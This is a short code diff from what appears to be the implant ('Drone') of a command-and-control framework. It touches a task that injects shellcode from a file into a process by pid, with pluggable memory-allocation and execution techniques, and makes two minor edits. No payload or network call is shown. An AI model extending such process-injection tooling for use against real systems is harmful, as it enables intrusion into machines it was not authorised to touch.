@@ -63,7 +63,7 @@ namespace Drone
             {
                 new("/path/to/shellcode.bin", false, true),
                 new("pid", false)
-            }),
+            })
         };
 
         private void GetCurrentDirectory(DroneTask task, CancellationToken token)
@@ -211,7 +211,7 @@ namespace Drone
             var allocType = Config.GetConfig<Type>("AllocationTechnique");
             var execType = Config.GetConfig<Type>("ExecutionTechnique");
             
-            var self = System.Reflection.Assembly.GetExecutingAssembly();
+            var self = System.Reflection.Assembly.GetCallingAssembly();
             var types = self.GetTypes();
 
             var allocationTechnique = (from type in types where type == allocType
